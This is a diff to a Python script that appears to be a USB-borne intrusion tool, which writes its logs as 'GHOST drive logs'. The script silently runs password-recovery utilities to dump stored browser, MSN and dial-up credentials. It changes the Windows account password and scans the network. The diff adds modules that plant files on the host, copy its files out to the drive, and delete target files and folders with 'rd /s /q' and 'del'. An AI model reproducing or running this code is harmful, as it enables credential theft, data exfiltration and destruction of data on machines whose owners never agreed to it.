@@ -1,4 +1,4 @@
-import os, sys, ctypes, getpass, socket, subprocess, urllib.request, math, wmi, platform, datetime, time
+import os, sys, ctypes, getpass, socket, subprocess, math, wmi, platform, datetime, time, requests
 exec(open("config.py").read())
 
 si = subprocess.STARTUPINFO()
@@ -24,16 +24,12 @@ elif duplicate_exec:
 else:
     sys.exit()
 rootdir = "..\\hosts\\" + root + "\\"
-os.chdir("payloads")
+log_error = ""
+
 # logging start
 if logging:
-    fl = open(rootdir+"Log.txt", "w")
     d = datetime.datetime.now()
     start_time = time.time()
-    logstart1 = d.strftime(r"%d-%m-%Y -> %A, %d/%B/%Y")
-    logstart2 = d.strftime(r"%I:%M:%S %p")
-    fl.write("Started on:\n\n"+"Date: "+logstart1+"\nTime: "+logstart2)
-    fl.close()
 
 
 # checking internet connectivity
@@ -44,6 +40,7 @@ except OSError:
     pass
     inet = 0
 
+os.chdir("payloads")
 # password recovery
 if browser_pwds:
     p = rootdir + "Browser passwords.html"
@@ -66,11 +63,6 @@ if msn_pwds:
 if dialup_pwds:
     p = rootdir + "Dialup passwords.html"
     subprocess.call(["Dialupass.exe" ,"/shtml", p], startupinfo=si)
-
-# recon
-if network_scan and inet:
-    p = rootdir + "Network scan.html"
-    subprocess.call(["WNetWatcher.exe", "/shtml", p], startupinfo=si)
 
 # changing nt password
 if change_nt_pwd["current_acc_controller"]:
@@ -95,15 +87,23 @@ if flush_dns:
 if register_dns:
     subprocess.call("ipconfig /registerdns", startupinfo=si)
 
-# Recon
+# recon
+if network_scan and inet:
+    p = rootdir + "Network scan.html"
+    subprocess.call(["WNetWatcher.exe", "/shtml", p], startupinfo=si)
+
 if batch_recon:
     if inet:
-        ext_ip = urllib.request.urlopen("https://api.ipify.org/").read()
-        ip = str(ext_ip)
-    else:
-        ip = "N/A"
+        ext_ip = requests.get("https://myexternalip.com/raw")
+        ip = str(ext_ip.text)
     inet = str(inet)
-    subprocess.call(["br.bat", root, rootdir, inet, ip], startupinfo=si)
+    if inet:
+        br_inet = "online"
+        br_ip = ip
+    else:
+        br_inet = "offline"
+        br_ip = "N/A"
+    subprocess.call(["br.bat", root, rootdir, br_inet, br_ip], startupinfo=si)
 if sysinfo:
     c = wmi.WMI()    
     sysinfo = c.Win32_ComputerSystem()[0]
@@ -137,18 +137,87 @@ if sysinfo:
     fh.write("Uname: " + str(platform.uname())+"\n")
     fh.close()
 
+os.chdir("../ext")
+# injector
+if injector["controller"]:
+    ipath = injector["path"]
+    if not injector["var_case"]:
+        if ipath is "":
+            log_error += "\n[injector] -> path is not defined"
+        elif not os.path.exists(ipath):
+            log_error += "\n[injector] -> path is invalid"
+        else:
+            if not os.path.isdir(ipath):
+                    log_error += "\n[injector] -> path must be a directory not a file"
+            else:
+                subprocess.call("cmd /c robocopy bin_inject "+'"'+ipath+'"'+" /s /e", startupinfo=si)
+    else:
+        subprocess.call("cmd /c robocopy bin_inject "+"\""+ipath+"\""+" /s /e", startupinfo=si)
+
+# retriever
+
+if retriever["controller"]:
+    rpath = retriever["path"]
+    if not retriever["var_case"]:
+        if rpath is "":
+            log_error += "\n[retriever] -> path is not defined"
+        elif not os.path.exists(rpath):
+            log_error += "\n[retriever] -> path is invalid"
+        else:
+            if os.path.isdir(rpath):
+                subprocess.call("cmd /c robocopy "+"\""+rpath+"\""+" bin_retrieve /s /e", startupinfo=si)
+            else:
+                subprocess.call("cmd /c copy "+"\""+rpath+"\""+" bin_retrieve", startupinfo=si) 
+    else:
+        if injector["var_case_dir"]:
+            subprocess.call("cmd /c robocopy "+"\""+rpath+"\""+" bin_retrieve /s /e", startupinfo=si)
+        else:
+            subprocess.call("cmd /c copy "+"\""+rpath+"\""+" bin_retrieve", startupinfo=si)
+
+# destroyer
+if destroyer["controller"]:
+    dpath = destroyer["path"]
+    if not injector["var_case"]:
+        if dpath is "":
+            log_error += "\n[destroyer] -> path is not defined"
+        elif not os.path.exists(dpath):
+            log_error += "\n[destroyer] -> path is invalid"
+        else:
+            if os.path.isdir(dpath):
+                subprocess.call("cmd /c rd /s /q "+"\""+dpath+"\"", startupinfo=si)
+            else:
+                subprocess.call("cmd /c del "+ "\"" +dpath+"\"", startupinfo=si)
+    else:
+        if injector["var_case_dir"]:
+            subprocess.call("cmd /c rd /s /q "+"\""+dpath+"\"", startupinfo=si)
+        else:
+            subprocess.call("cmd /c del "+ "\"" +dpath+"\"", startupinfo=si)
+
 # logging end
 if logging:
-    fl = open(rootdir+"Log.txt", "a")
+    fl = open(rootdir+"Log.txt", "w")
     d2 = datetime.datetime.now()
     end_time = time.time()
     et = end_time - start_time
     et = round(et)
-    elapsed_time = str(et)
+    if et > 1:
+        elapsed_time = str(et) + " seconds"
+    elif et is 0:
+        elapsed_time = str(et) + " seconds"
+    else:
+        elapsed_time = str(et) + " second"
+    logstart1 = d.strftime(r"%d-%m-%Y -> %A, %d/%B/%Y")
+    logstart2 = d.strftime(r"%I:%M:%S %p")
     logend1 = d2.strftime(r"%d-%m-%Y -> %A, %d/%B/%Y")
     logend2 = d2.strftime(r"%I:%M:%S %p")
-    fl.write("\n\n\nFinished on:\n\n"+"Date: "+logend1+"\nTime: "+logend2)
-    fl.write("\n\nElapsed time: "+elapsed_time+" secs")
+    fl.write("GHOST drive logs\n----------------\n\n")
+    fl.write("Started on:\n===================================\n"+"Date: "+logstart1+"\nTime: "+logstart2)
+    fl.write("\n\n\nFinished on:\n===================================\n"+"Date: "+logend1+"\nTime: "+logend2)
+    fl.write("\n\nElapsed time: "+elapsed_time)
+    fl.write("\n\nErrors:\n===================================")
+    if log_error is "":
+        log_error += "\n[+] None"
+    fl.write(log_error)
     fl.close()
 
 
